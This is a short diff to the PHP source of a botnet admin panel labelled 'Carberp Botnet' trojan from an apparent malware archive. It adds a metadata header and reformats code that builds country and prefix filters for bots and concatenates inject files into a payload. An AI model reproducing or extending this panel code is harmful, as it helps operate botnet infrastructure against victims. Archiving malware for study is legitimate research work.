@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 include_once('modules/admins/country_code.php');
 $smarty->assign('country_code', $country_code);
@@ -29,12 +40,16 @@ if(!empty($Cur['id'])){
 				$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
 				$get_php .= file_get_contents('modules/admins/injects/functions.php');
 
-				if(!empty($_POST['country'][0]) && $_POST['country'][0] != '*'){					$country = implode('|', $_POST['country']) . '|';
-				}else{					$country = '*';
+				if(!empty($_POST['country'][0]) && $_POST['country'][0] != '*'){
+					$country = implode('|', $_POST['country']) . '|';
+				}else{
+					$country = '*';
 				}
 
-				if(!empty($_POST['prefix'][0]) && $_POST['prefix'][0] != '*'){					$prefix = implode('|', $_POST['prefix']) . '|';
-				}else{					$prefix = '*';
+				if(!empty($_POST['prefix'][0]) && $_POST['prefix'][0] != '*'){
+					$prefix = implode('|', $_POST['prefix']) . '|';
+				}else{
+					$prefix = '*';
 				}
 
 	            $time = time();
